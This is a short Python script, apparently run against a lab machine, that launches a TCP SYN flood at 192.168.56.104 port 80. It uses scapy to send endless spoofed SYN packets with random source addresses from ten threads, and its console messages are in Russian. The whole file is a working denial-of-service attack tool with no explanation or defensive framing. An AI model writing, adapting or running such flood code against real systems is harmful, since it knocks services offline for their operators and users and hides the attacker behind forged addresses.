#!/usr/bin/env python3
from scapy.all import *
import random
import threading

from scapy.layers.inet import IP, TCP

target_ip = "192.168.56.104"
target_port = 80


def syn_flood():
    while True:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)

        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=0)


print(f"[*] SYN Flood на {target_ip}:{target_port}")
print("[*] Запуск 10 потоков...")

threads = []
for i in range(10):
    t = threading.Thread(target=syn_flood)
    t.daemon = True
    t.start()
    threads.append(t)

print("[*] Атака запущена! Ctrl+C для остановки")

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\n[*] Остановка атаки...")